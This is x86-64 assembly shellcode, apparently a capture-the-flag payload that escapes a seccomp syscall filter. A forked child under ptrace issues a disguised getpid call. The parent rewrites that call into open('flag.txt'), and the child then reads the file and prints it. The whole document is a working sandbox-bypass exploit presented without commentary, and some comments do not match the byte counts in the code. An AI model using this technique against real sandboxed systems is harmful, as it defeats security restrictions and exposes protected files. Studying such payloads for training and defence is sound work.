start:
    push   rbp
    mov    rbp, rsp
    sub    rsp, 0x120

    /* call fork() */
    mov    eax, 0x39
    syscall

    mov    DWORD PTR [rbp-0x120],eax
    cmp    DWORD PTR [rbp-0x120],0x0
    jne    parent

    /* call ptrace('PTRACE_TRACEME', 0, 0, 0) */
    mov    ecx,0x0
    mov    edx,0x0
    mov    esi,0x0
    mov    edi,0x0
    mov    eax, 0x65
    mov    r10,rcx
    syscall

    /* call gettid() */
    mov    eax,0xba
    syscall

    /* call tkill('rdi', 'SIGSTOP') */
    mov    esi,0x13
    mov    edi,eax
    mov    eax,0xc8
    syscall
    
    /* call getpid() */
    mov    esi,0x0
    lea    rdi, [rip + offset filename]
    mov    eax,0x27
    syscall

    /* call read(fd=0, 'rbp-0x30', 48) */
    mov    DWORD PTR [rbp-0x11c],eax
    lea    rcx,[rbp-0x30]
    mov    eax,DWORD PTR [rbp-0x11c]
    mov    edx,0x40
    mov    rsi,rcx
    mov    edi,eax
    mov    eax,0x0
    syscall

    /* call write(fd=1, 'rbp-0x30', n='rax') */
    mov    QWORD PTR [rbp-0x118],rax
    mov    rdx, 0x100
    lea    rax,[rbp-0x30]
    mov    rsi,rax
    mov    edi,0x1
    mov    eax,0x1
    syscall


parent:
    /* call wait4(childpid, 0, 0) */
    mov    eax,DWORD PTR [rbp-0x120]
    mov    ecx,0x0
    mov    edx,0x0
    mov    esi,0x0
    mov    edi,eax
    mov    r10,rcx
    mov    eax,0x3d
    syscall 

    /* ptrace(request='PTRACE_SYSCALL', childpid, 0, 0) */
    mov    eax,DWORD PTR [rbp-0x120]
    mov    ecx,0x0
    mov    edx,0x0
    mov    esi,eax
    mov    edi,0x18
    mov    eax,0x65
    mov    r10,rcx
    syscall

    /* call wait4(0, 0, 0) */
    mov    eax,DWORD PTR [rbp-0x120]
    mov    ecx,0x0
    mov    edx,0x0
    mov    esi,0x0
    mov    edi,eax
    mov    r10,rcx
    mov    eax,0x3d
    mov    r10,rcx
    syscall

    /* ptrace(request='PTRACE_GETREGS', childpid, 0, 'rbp-0x110') */
    lea    rdx,[rbp-0x110]
    mov    eax,DWORD PTR [rbp-0x120]
    mov    rcx,rdx
    mov    edx,0x0
    mov    esi,eax
    mov    edi,0xc
    mov    r10,rcx
    mov    eax,0x65
    syscall

    mov    QWORD PTR [rbp-0x98],0x2

    /* ptrace(request='PTRACE_SETREGS', childpid, 0, 'rbp-0x110') */
    lea    rdx,[rbp-0x110]
    mov    eax,DWORD PTR [rbp-0x120]
    mov    rcx,rdx
    mov    edx,0x0
    mov    esi,eax
    mov    edi,0xd
    mov    eax,0x65
    mov    r10,rcx
    syscall

    /* ptrace(request='PTRACE_DETACH', childpid, 0, 0) */
    mov    eax,DWORD PTR [rbp-0x120]
    mov    ecx,0x0
    mov    edx,0x0
    mov    esi,eax
    mov    edi,0x11
    mov    eax,0x65
    mov    r10,rcx
    syscall

filename:
    .ascii "flag.txt\0"
